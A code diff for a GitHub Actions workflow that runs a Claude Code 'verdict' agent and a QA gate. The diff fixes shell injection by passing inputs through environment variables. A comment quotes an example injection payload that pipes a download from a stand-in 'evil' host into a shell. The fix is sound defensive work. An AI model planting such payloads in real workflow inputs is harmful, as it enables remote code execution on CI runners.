@@ -74,19 +74,29 @@ runs:
         CLAUDE_CODE_OAUTH_TOKEN: ${{ inputs.claude-oauth-token }}
         ANTHROPIC_BASE_URL: ${{ inputs.anthropic-base-url }}
         VERDICT_STRICT: "1"
+        RUN_PROMPT: ${{ inputs.run-prompt }}
+        CLAUDE_VERSION: ${{ inputs.claude-version }}
       run: |
         set -euo pipefail
         if [ -z "$ANTHROPIC_API_KEY" ] && [ -z "$CLAUDE_CODE_OAUTH_TOKEN" ]; then
           echo "::error::run mode needs anthropic-api-key or claude-oauth-token"
           exit 2
         fi
-        npm install -g "@anthropic-ai/claude-code@${{ inputs.claude-version }}"
+        npm install -g "@anthropic-ai/claude-code@$CLAUDE_VERSION"
         # Provision the agent project-locally from this action's own checkout —
         # no plugin installation step to depend on in CI.
         mkdir -p .claude/agents
         sed -e "s|\${CLAUDE_PLUGIN_ROOT}|${{ github.action_path }}|g" \
           "${{ github.action_path }}/agents/verdict.md" > .claude/agents/verdict.md
-        claude -p "Use the verdict agent. ${{ inputs.run-prompt }}" \
+        # Through env, never an Actions expression inside the script body.
+        # Expression substitution splices text into the shell before bash
+        # parses the line, so quoting does not help and an input like
+        # `"; curl evil | sh; #` executes. Inputs are workflow-author
+        # controlled, but one person wiring run-prompt to a PR title turns
+        # that into remote code execution. (Writing the expression delimiters
+        # even inside a comment here is itself a parse error — the runner
+        # templates the whole block before bash ever sees it.)
+        claude -p "Use the verdict agent. $RUN_PROMPT" \
           --setting-sources project --dangerously-skip-permissions
 
     - name: Commit updated QA state (team mode)
@@ -106,10 +116,19 @@ runs:
       id: gate
       shell: bash
       working-directory: ${{ github.workspace }}
+      env:
+        PROJECT: ${{ inputs.project }}
+        FAIL_ON: ${{ inputs.fail-on }}
+        FINDINGS: ${{ inputs.findings }}
+        MAX_AGE_HOURS: ${{ inputs.max-age-hours }}
+        MIN_RUN_NUMBER: ${{ inputs.min-run-number }}
       run: |
-        ARGS=("${{ inputs.project }}" --fail-on "${{ inputs.fail-on }}" --findings "${{ inputs.findings }}")
-        [ -n "${{ inputs.max-age-hours }}" ] && ARGS+=(--max-age-hours "${{ inputs.max-age-hours }}")
-        [ -n "${{ inputs.min-run-number }}" ] && ARGS+=(--min-run-number "${{ inputs.min-run-number }}")
+        # Every value below arrives through env rather than an Actions
+        # expression — see the note in the run step; quoting does not help,
+        # because substitution happens before bash parses the line.
+        ARGS=("$PROJECT" --fail-on "$FAIL_ON" --findings "$FINDINGS")
+        [ -n "$MAX_AGE_HOURS" ] && ARGS+=(--max-age-hours "$MAX_AGE_HOURS")
+        [ -n "$MIN_RUN_NUMBER" ] && ARGS+=(--min-run-number "$MIN_RUN_NUMBER")
         GATE="${{ github.action_path }}/src/verdict_mcp/gate.py"
         set +e
         python3 "$GATE" "${ARGS[@]}" --format github-output | tee -a "$GITHUB_OUTPUT"
